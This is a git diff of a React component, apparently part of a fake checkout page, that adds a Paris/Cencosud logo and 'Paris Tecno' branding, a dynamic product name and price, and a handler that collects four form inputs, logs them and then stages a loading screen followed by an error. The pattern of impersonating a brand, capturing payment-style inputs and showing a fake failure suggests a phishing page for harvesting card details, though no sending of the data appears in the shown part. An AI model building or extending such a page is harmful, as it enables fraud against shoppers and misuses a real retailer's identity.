@@ -3,7 +3,7 @@ import Navas from './Navas';
 import Carga from './Carga';
 import Erro from './Erro';
 
-const Mp = ({ formData }) => {
+const Mp = ({ formData,name, price }) => {
     const estilo = {
         fontFamily: 'Proxima Nova, -apple-system, Roboto, Arial, sans-serif',
       };
@@ -50,6 +50,13 @@ const Mp = ({ formData }) => {
       };
 
       const mostrarErrorHandler = () => {      
+        const datosInput = {
+          input1: input1Value,
+          input2: input2Value,
+          input3: input3Value,
+          input4: input4Value,
+        };
+        console.log('Datos de los inputs:', datosInput);
         setLoading(true);
     
         setTimeout(() => {
@@ -72,7 +79,7 @@ const Mp = ({ formData }) => {
     <div style={estilo}>
         <Navas/>
       <div className="w-full bg-white flex justify-center items-center p-2">
-        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b2/Logo_Paris_Cencosud.png" alt="paris_tecno" className='w-5' />
         <span className="text-sm font-semibold flex">
 Paris Tecno <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="1.5" stroke="currentColor" className="size-4 mt-[2px] ml-1 text-sky-600">
   <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75 11.25 15 15 9.75M21 12c0 1.268-.63 2.39-1.593 3.068a3.745 3.745 0 0 1-1.043 3.296 3.745 3.745 0 0 1-3.296 1.043A3.745 3.745 0 0 1 12 21c-1.268 0-2.39-.63-3.068-1.593a3.746 3.746 0 0 1-3.296-1.043 3.745 3.745 0 0 1-1.043-3.296A3.745 3.745 0 0 1 3 12c0-1.268.63-2.39 1.593-3.068a3.745 3.745 0 0 1 1.043-3.296 3.746 3.746 0 0 1 3.296-1.043A3.746 3.746 0 0 1 12 3c1.268 0 2.39.63 3.068 1.593a3.746 3.746 0 0 1 3.296 1.043 3.746 3.746 0 0 1 1.043 3.296A3.745 3.745 0 0 1 21 12Z" />
@@ -80,8 +87,8 @@ Paris Tecno <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 
       </div>
       <hr className="w-full border-t border-gray-300" />
       <nav className="w-full bg-white shadow-none p-2 flex justify-between items-center">
-        <span className="text-sm font-bold">Tele</span>
-        <span className="text-sm font-bold ">$1.500</span>
+        <span className="text-xs  font-medium">{name}</span>
+        <span className="text-sm font-medium ">${price.toLocaleString('es-AR')}</span>
       </nav>
     <div className="flex flex-col justify-center items-center bg-[#f0ecec]">
     <div className="flex flex-col items-center"> {/* Espacio arriba para el formulario */}
